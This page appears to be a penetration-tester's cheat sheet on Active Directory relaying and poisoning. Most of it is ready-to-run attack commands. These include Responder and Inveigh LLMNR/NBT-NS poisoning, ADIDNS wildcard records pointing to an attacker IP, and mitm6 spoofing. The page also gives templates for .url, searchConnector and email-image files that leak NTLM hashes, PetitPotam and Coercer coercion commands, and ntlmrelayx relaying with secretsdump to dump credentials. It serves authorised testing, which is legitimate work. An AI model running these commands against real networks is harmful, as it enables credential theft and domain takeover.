  
    <nav class="md-nav" aria-label="Files">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#link-file" class="md-nav__link">
    <span class="md-ellipsis">
      Link file
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#url-file" class="md-nav__link">
    <span class="md-ellipsis">
      URL file
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#searchconnector" class="md-nav__link">
    <span class="md-ellipsis">
      SearchConnector
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1x1-image-in-emails" class="md-nav__link">
    <span class="md-ellipsis">
      1x1 image in Emails
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#for-other-filetypes-check-out-the-tools-listed" class="md-nav__link">
    <span class="md-ellipsis">
      For other filetypes check out the tools listed
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#coercing" class="md-nav__link">
    <span class="md-ellipsis">
      Coercing
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Coercing">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-which-coercer-methods-are-available" class="md-nav__link">
    <span class="md-ellipsis">
      Check which coercer methods are available
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#force-auth-to-attacker-ip" class="md-nav__link">
    <span class="md-ellipsis">
      Force auth to attacker IP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webdav-auth" class="md-nav__link">
    <span class="md-ellipsis">
      WEBDAV auth
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#relaying" class="md-nav__link">
    <span class="md-ellipsis">
      Relaying
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Relaying">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-relaying" class="md-nav__link">
    <span class="md-ellipsis">
      SMB relaying
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB relaying">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-for-smb-hosts-without-smb-signing" class="md-nav__link">
    <span class="md-ellipsis">
      Check for SMB hosts without SMB signing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#relay-requests-smb-and-dump-sam" class="md-nav__link">
    <span class="md-ellipsis">
      Relay requests SMB and dump SAM
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#relay-requests-smb-and-keep-smb-sessions-open" class="md-nav__link">
    <span class="md-ellipsis">
      Relay requests SMB and keep SMB sessions open
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ldap-relaying" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP Relaying
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LDAP Relaying">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-ldap-signing-or-binding" class="md-nav__link">
    <span class="md-ellipsis">
      Check LDAP Signing or Binding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#resource-based-constraind-delegation-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Resource Based Constraind Delegation attacks
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="relaying-poisoning">Relaying &amp; Poisoning</h1>
<h2 id="poisoning">Poisoning</h2>
<ul>
<li>Poisoning is possible with Responder or Inveigh or manually, which will try to poison Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).</li>
</ul>
<h2 id="llmnr-nbt-ns">LLMNR &amp; NBT-NS</h2>
<h3 id="responder">Responder</h3>
<h4 id="analyse-mode">Analyse mode</h4>
<ul>
<li>It is possible to check if LLMNR and NBT-NS is used without poisoning any request.
<div class="highlight"><pre><span></span><code>sudo responder -I eth0 -A
</code></pre></div></li>
</ul>
<h4 id="poison-requests">Poison Requests</h4>
<ul>
<li>Poison Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS) requests.
<div class="highlight"><pre><span></span><code>sudo responder -I eth0
</code></pre></div></li>
</ul>
<h3 id="inveigh">Inveigh</h3>
<ul>
<li>https://github.com/Kevin-Robertson/Inveigh</li>
<li>Can poison LLMNR and NBTNS, but also ADIDNS</li>
<li>Use <code>-ConsoleOutput Y</code> to enable ConsoleOutput</li>
</ul>
<h4 id="analyse-mode_1">Analyse mode</h4>
<div class="highlight"><pre><span></span><code>Invoke-Inveigh -Inspect
</code></pre></div>
<h4 id="run-inveigh">Run inveigh</h4>
<div class="highlight"><pre><span></span><code>Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
</code></pre></div>
<h4 id="get-data-from-hashtable">Get data from hashtable</h4>
<div class="highlight"><pre><span></span><code>Get-Inveigh - get data from the $inveigh hashtable
</code></pre></div>
<h4 id="get-all-captured-ntlmv2-challengeresponse-hashes">Get all captured NTLMv2 challenge/response hashes</h4>
<div class="highlight"><pre><span></span><code>Get-Inveigh -NTLMv2
</code></pre></div>
<h4 id="stop">Stop</h4>
<div class="highlight"><pre><span></span><code>Stop-Inveigh
</code></pre></div>
<h4 id="enable-real-time-console-output">Enable real time console output</h4>
<div class="highlight"><pre><span></span><code>Watch-Inveigh
</code></pre></div>
<h4 id="clear-hashtable">Clear hashtable</h4>
<div class="highlight"><pre><span></span><code>Clear-Inveigh
</code></pre></div>
<h4 id="get-inveigh">Get-Inveigh</h4>
<div class="highlight"><pre><span></span><code>Get-Inveigh
</code></pre></div>
<h3 id="active-directory-integrated-dns">Active Directory-Integrated DNS</h3>
<ul>
<li>ADIDNS</li>
<li>Windows uses DNS, LLMNR and then NBNS in the respective order</li>
<li>If a matching DNS record name does not already exist in a zone, an authenticated user can create the record.</li>
<li>If you detectthe same LLMNR/NBNS request from multiple systems, a matching record can be added to ADIDNS. This can be effective when systems are sending out LLMNR/NBNS requests for old hosts that are no longer in DNS. If multiple systems within a subnet are trying to resolve specific names, outside systems may also be trying. In that scenario, injecting into ADIDNS will help extend the attack past the subnet boundary.</li>
<li>https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/</li>
<li>https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing</li>
<li>https://github.com/Kevin-Robertson/Powermad</li>
</ul>
<h4 id="check-wins-forward-lookup">Check WINS forward lookup</h4>
<ul>
<li>If WINS forward lookup is enabled then adding a wildcard record won't work.</li>
<li>https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py</li>
<li>The entry type <code>65281</code> (i.e. <code>WINS</code>) will exist if WINS forward lookup is enabled.
<div class="highlight"><pre><span></span><code>dnstool.py -u &#39;DOMAIN\USER&#39; -p &#39;PASSWORD&#39; --record &#39;@&#39; --action &#39;query&#39; &lt;DC IP&gt;

dnstool.py -u &#39;DOMAIN\USER&#39; -p &#39;PASSWORD&#39; --record &#39;@&#39; --action &#39;query&#39; &lt;DC IP&gt; | grep &quot;WINS\|65281&quot;
</code></pre></div></li>
</ul>
<h4 id="check-adidns-permissions">Check ADIDNS permissions</h4>
<ul>
<li>By default <code>authenticated users</code> have the <code>CreateChild</code> permissions.
<div class="highlight"><pre><span></span><code>Get-ADIDNSPermission

Get-ADIDNSPermission | Where-Object -Property IdentityReference -EQ S-1-5-11 | Where-Object -Property ActiveDirectoryRights -EQ CreateChild
</code></pre></div></li>
</ul>
<h4 id="check-for-wildcard-record">Check for wildcard record</h4>
<ul>
<li>The DNS server will use the wildcard record to answer name requests that do not explicitly match records contained in the zone.</li>
<li>Gives error if it doesn't exist.
<div class="highlight"><pre><span></span><code>Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord

Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Partition System
Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Partition ForestDNSZones
</code></pre></div></li>
</ul>
<div class="highlight"><pre><span></span><code>dnstool.py -u &#39;DOMAIN\USER&#39; -p &#39;PASSWORD&#39; --record &#39;*&#39; --action &#39;query&#39; &lt;DC IP&gt;
dnstool.py -u &#39;DOMAIN\USER&#39; -p &#39;PASSWORD&#39; --record &#39;*&#39; --action &#39;query&#39; &lt;DC IP&gt; --legacy
dnstool.py -u &#39;DOMAIN\USER&#39; -p &#39;PASSWORD&#39; --record &#39;*&#39; --action &#39;query&#39; &lt;DC IP&gt; --forest
dnstool.py -u &#39;DOMAIN\USER&#39; -p &#39;PASSWORD&#39; --record &#39;*&#39; --action &#39;query&#39; &lt;DC IP&gt; --partition
</code></pre></div>
<h4 id="create-wildcard-record">Create wildcard record</h4>
<ul>
<li>By default, replication between sites can take up to three hours.</li>
<li>Use <code>-Tombstone</code> so any authenticated user can perform node modifications
<div class="highlight"><pre><span></span><code>New-ADIDNSNode -Node * -Data &lt;ATTACKER IP&gt; -Verbose

New-ADIDNSNode -Node * -Data &lt;ATTACKER IP&gt; -Verbose -Tombstone
</code></pre></div></li>
</ul>
<div class="highlight"><pre><span></span><code>dnstool.py -u &#39;DOMAIN\USER&#39; -p &#39;PASSWORD&#39; --record &#39;*&#39; --action add --data &lt;ATTACKER IP&gt; &lt;DC IP&gt;
</code></pre></div>
<h4 id="give-other-groups-permissions-to-the-record">Give other groups permissions to the record</h4>
<ul>
<li>Optional
<div class="highlight"><pre><span></span><code>Grant-ADIDNSPermission -Node * -Principal &quot;Authenticated Users&quot; -Access GenericAll -Verbose
</code></pre></div></li>
</ul>
<h4 id="enable-tombstoned-record">Enable tombstoned record</h4>
<div class="highlight"><pre><span></span><code>Enable-ADIDNSNode -Node *
</code></pre></div>
<h4 id="tombstone-record">Tombstone record</h4>
<div class="highlight"><pre><span></span><code>Disable-ADIDNSNode -Node *
</code></pre></div>
<h4 id="cleanup-record">Cleanup record</h4>
<div class="highlight"><pre><span></span><code>Remove-ADIDNSNode -Node *
</code></pre></div>
<div class="highlight"><pre><span></span><code>dnstool.py -u &#39;DOMAIN\USER&#39; -p &#39;PASSWORD&#39; --record &#39;*&#39; --action remove --data &lt;ATTACKER IP&gt; &lt;DC IP&gt;
</code></pre></div>
<h4 id="check-dns">Check DNS</h4>
<div class="highlight"><pre><span></span><code>nslookup idontexist.&lt;DOMAIN&gt;
Resolve-DnsName idontexist.&lt;DOMAIN&gt;
</code></pre></div>
<h3 id="inveigh_1">Inveigh</h3>
<ul>
<li>Inveigh can dynically spoof this too</li>
<li><code>combo</code> Add a record to DNS if the same request is received with LLMNR/NBNS from multiple systems</li>
<li><code>ns</code> injects an NS record and if needed, a target record. This is primarily for the GQBL bypass for wpad.</li>
<li><code>wildcard</code> injects a wildcard record
<div class="highlight"><pre><span></span><code>Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
</code></pre></div></li>
</ul>
<h3 id="mitm6">Mitm6</h3>
<ul>
<li>https://github.com/dirkjanm/mitm6</li>
<li>In modern Windows operating systems, IPv6 is enabled by default. This means that systems periodically poll for an IPv6 lease, as IPv6 is a newer protocol than IPv4, and Microsoft decided it was a good idea to give IPv6 precedence over IPv4.</li>
<li>However, in the vast majority of organizations, IPv6 is left unused, which means that an adversary could hijack the DHCP requests for IPv6 addresses and force authentication attempts to the attacker-controlled system. We do that by setting our system as the primary DNS server.</li>
<li>Spoof any requests for internal resources
<div class="highlight"><pre><span></span><code>sudo python3 mitm6.py -d &lt;DOMAIN&gt; --ignore-nofqdn
</code></pre></div></li>
</ul>
<h3 id="files">Files</h3>
<ul>
<li>It is possible to force authentication if a user opens a file location in explorer or files itself.</li>
<li>Will authenticate to our attacking machine as the user</li>
<li>Tools that can create these files:</li>
<li>https://github.com/mdsecactivebreach/Farmer - Windows</li>
<li>https://github.com/Greenwolf/ntlm_theft - Python</li>
</ul>
<h4 id="link-file">Link file</h4>
<ul>
<li>Explorer automaticly connects if folder where the SearchConnector is, is opened.</li>
<li>On Windows right click --&gt; New --&gt; Shortcut --&gt; and in the URL use</li>
<li>Creates a <code>[SMB] NTLMv2-SSP Hash</code> in responder, <code>[*] SMBD-Thread-4:</code> in ntlmrelayx. Can be used against relaying to SMB.
<div class="highlight"><pre><span></span><code>file://&lt;IP&gt;/test
</code></pre></div></li>
</ul>
<h4 id="url-file">URL file</h4>
<ul>
<li>Explorer automaticly connects if folder where the SearchConnector is, is opened.</li>
<li>Filename <code>something.url</code></li>
<li>Creates a <code>[SMB] NTLMv2-SSP Hash</code> in responder, <code>[*] SMBD-Thread-x:</code> in ntlmrelayx. Can be used against relaying to SMB.
<div class="highlight"><pre><span></span><code>[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\&lt;IP&gt;\%USERNAME%.icon
IconIndex=1
</code></pre></div></li>
</ul>
<h4 id="searchconnector">SearchConnector</h4>
<ul>
<li>Explorer automaticly connects if folder where the SearchConnector is, is opened.</li>
<li>Actives the Windows Webclient service which can be used to authenticate a host again to the attacking IP with petitpotam.</li>
<li>Creates a <code>[WebDAV] NTLMv2 Hash</code> in responder, <code>HTTPD: received</code> in ntlmrelayx. Can be used against relaying to ldap, ldaps and SMB</li>
<li>https://www.bussink.net/webclient_activation/</li>
<li>Filename <code>Documents.searchConnector-ms</code>
<div class="highlight"><pre><span></span><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;searchConnectorDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/searchConnector&quot;&gt;
    &lt;iconReference&gt;imageres.dll,-1002&lt;/iconReference&gt;
    &lt;description&gt;Microsoft Outlook&lt;/description&gt;
    &lt;isSearchOnlyItem&gt;false&lt;/isSearchOnlyItem&gt;
    &lt;includeInStartMenuScope&gt;true&lt;/includeInStartMenuScope&gt;
    &lt;iconReference&gt;//&lt;ATTACKER IP&gt;@80/test.ico&lt;/iconReference&gt;
    &lt;templateInfo&gt;
        &lt;folderType&gt;{91475FE5-586B-4EBA-8D75-D17434B8CDF6}&lt;/folderType&gt;
    &lt;/templateInfo&gt;
    &lt;simpleLocation&gt;
        &lt;url&gt;//&lt;ATTACKER IP&gt;@80/test&lt;/url&gt;
    &lt;/simpleLocation&gt;
&lt;/searchConnectorDescription&gt;
</code></pre></div></li>
</ul>
<h4 id="1x1-image-in-emails">1x1 image in Emails</h4>
<div class="highlight"><pre><span></span><code>&lt;img src=&quot;\\&lt;IP&gt;\test.ico&quot; height=&quot;1&quot; width=&quot;1&quot; /&gt;
</code></pre></div>
<h4 id="for-other-filetypes-check-out-the-tools-listed">For other filetypes check out the tools listed</h4>
<h2 id="coercing">Coercing</h2>
<ul>
<li>https://github.com/p0dalirius/Coercer</li>
</ul>
<h4 id="check-which-coercer-methods-are-available">Check which coercer methods are available</h4>
<div class="highlight"><pre><span></span><code>python3 Coercer.py scan -t &lt;TARGET IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt;
</code></pre></div>
<h4 id="force-auth-to-attacker-ip">Force auth to attacker IP</h4>
<div class="highlight"><pre><span></span><code>python3 Coercer.py coerse -L &lt;ATTACKER IP&gt; -t &lt;TARGET IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt;
</code></pre></div>
<h4 id="webdav-auth">WEBDAV auth</h4>
<ul>
<li>https://github.com/topotam/PetitPotam</li>
<li>https://github.com/dirkjanm/krbrelayx</li>
<li>Creates a <code>[WebDAV] NTLMv2 Hash</code> in responder, <code>HTTPD: received</code> in ntlmrelayx. Can be used against relaying to ldap, ldaps.</li>
<li>Will authenticate to our attacking machine as the computer account. Can be used for RBCD.
<div class="highlight"><pre><span></span><code>python3 PetitPotam.py -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; &lt;HOSTNAME ATTACKER MACHINE&gt;@80/a &lt;TARGET&gt;

python3 printerbug.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET&gt; &lt;HOSTNAME ATTACKER MACHINE&gt;@80/a
</code></pre></div></li>
</ul>
<h2 id="relaying">Relaying</h2>
<h3 id="smb-relaying">SMB relaying</h3>
<ul>
<li>Requirement: Only possible to hosts without SMB Signing</li>
</ul>
<h4 id="check-for-smb-hosts-without-smb-signing">Check for SMB hosts without SMB signing</h4>
<div class="highlight"><pre><span></span><code>crackmapexec smb &lt;IP RANGE&gt; --gen-relay-list smb_hosts_nosigning.txt
</code></pre></div>
<h4 id="relay-requests-smb-and-dump-sam">Relay requests SMB and dump SAM</h4>
<ul>
<li>We have to modify the <code>/etc/responder/Responder.conf</code> file and disable the HTTP and SMB servers (as NTLM relay will be our SMB and HTTP server).</li>
<li>the <code>-d</code> flag has now been changed from “Enable answers for NETBIOS domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False” to “Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False”. It should also be noted that <code>-d</code> as it is now CAN have an impact on your client’s network, as you are effectively poisoning the WPAD file over DHCP, which does not always revert back immediately once you stop the attack. It will likely require a reboot.
<div class="highlight"><pre><span></span><code>ntlmrelayx.py -tf smb_hosts_nosigning.txt -smb2support
</code></pre></div></li>
</ul>
<h4 id="relay-requests-smb-and-keep-smb-sessions-open">Relay requests SMB and keep SMB sessions open</h4>
<ul>
<li>Use the <code>socks</code> option to be able to use the <code>socks</code> command to get a nice overview of the relayed attempts. It will also keep the SMB connection open indefinitely. </li>
<li>The file <code>smb_hosts_nosigning.txt</code> should only contain IP's, FQDN doesn't work, see <a href="https://github.com/fortra/impacket/issues/642">issue</a>
<div class="highlight"><pre><span></span><code>ntlmrelayx.py -tf smb_hosts_nosigning.txt -socks -smb2support

# Get overview of all relay attempts
ntlmrelayx&gt; socks

# Change socks proxy
sudo vim /etc/proxychains4.conf
socks4 127.0.0.1 1080

# Use proxychains and it will ignore the password value and use the relay credential instead
proxychains python3 secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:IDontCareAboutPassword@&lt;TARGET&gt;

# Also possible to access shares on the network, for example if user is not local admin
proxychains python3 smbclient.py &lt;DOMAIN&gt;/&lt;USER&gt;:IDontCareAboutPassword@&lt;TARGET&gt;
</code></pre></div></li>
</ul>
<h2 id="ldap-relaying">LDAP Relaying</h2>
<ul>
<li>Requires LDAP signing or LDAPS Binding to be turned off (default).</li>
</ul>
<h4 id="check-ldap-signing-or-binding">Check LDAP Signing or Binding</h4>
<ul>
<li>https://github.com/zyn3rgy/LdapRelayScan
<div class="highlight"><pre><span></span><code>python3 LdapRelayScan.py -method BOTH -dc-ip &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;

cme ldap &lt;DC IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; -M ldap-checker
</code></pre></div></li>
</ul>
<h3 id="resource-based-constraind-delegation-attacks">Resource Based Constraind Delegation attacks</h3>
<ul>
<li><a href="Domain-Privilege-Escalation.md#Webclient-Attack">Webclient Attack</a></li>
<li><a href="Domain-Privilege-Escalation.md#Change-Lockscreen">Change-Lockscreen</a></li>
</ul>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.ad660dcc.min.js"></script>
      
    
  </body>
</html>